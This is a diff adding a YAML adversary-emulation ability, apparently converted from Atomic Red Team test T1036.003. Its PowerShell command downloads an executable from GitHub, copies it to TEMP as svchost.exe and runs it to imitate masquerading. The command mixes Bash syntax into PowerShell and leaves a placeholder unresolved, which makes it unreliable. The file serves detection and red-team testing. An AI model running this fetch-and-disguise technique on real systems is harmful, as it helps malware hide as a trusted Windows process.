@@ -1,0 +1,61 @@
+- id: bc15c13f-d121-4b1f-8c7d-28d95854d086
+  name: Masquerading - non-windows exe running as windows exe
+  description: 'Copies an exe, renames it as a windows exe, and launches it to masquerade
+    as a real windows exe
+
+
+    Upon successful execution, powershell will execute T1036.003.exe as svchost.exe
+    from on a non-standard path.'
+  tactic: defense-evasion
+  technique:
+    attack_id: T1036.003
+    name: 'Masquerading: Rename System Utilities'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path "PathToAtomicsFolder\T1036.003\bin\T1036.003.exe")
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
+          "PathToAtomicsFolder\T1036.003\bin\T1036.003.exe") -ErrorAction ignore |
+          Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/bin/T1036.003.exe"
+          -OutFile "PathToAtomicsFolder\T1036.003\bin\T1036.003.exe"; fi; copy "PathToAtomicsFolder\T1036.003\bin\T1036.003.exe"
+          ($env:TEMP + "\svchost.exe"); try { $myT1036_003 = (Start-Process -PassThru
+          -FilePath ($env:TEMP + "\svchost.exe")).Id }; catch { $_; exit $_.Exception.HResult};
+          Stop-Process -ID $myT1036_003'
+        cleanup: 'Remove-Item #{outputfile} -Force -ErrorAction Ignore'
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - defense-evasion
+  - atomic-red-team
+  - t1036.003
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      outputfile:
+        description: path of file to execute
+        type: path
+        default: ($env:TEMP + "\svchost.exe")
+      inputfile:
+        description: path of file to copy
+        type: path
+        default: PathToAtomicsFolder\T1036.003\bin\T1036.003.exe
+    dependencies:
+    - description: 'Exe file to copy must exist on disk at specified location (#{inputfile})
+
+        '
+      prereq_command: 'if (Test-Path "#{inputfile}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (split-path "#{inputfile}") -ErrorAction
+        ignore | Out-Null
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/bin/T1036.003.exe"
+        -OutFile "#{inputfile}"
+
+        '
+    technique_created: '2020-02-10T20:03:11.691Z'
+    atomic_guid: bc15c13f-d121-4b1f-8c7d-28d95854d086
+    import_timestamp: '2025-06-24T11:15:01.240602Z'
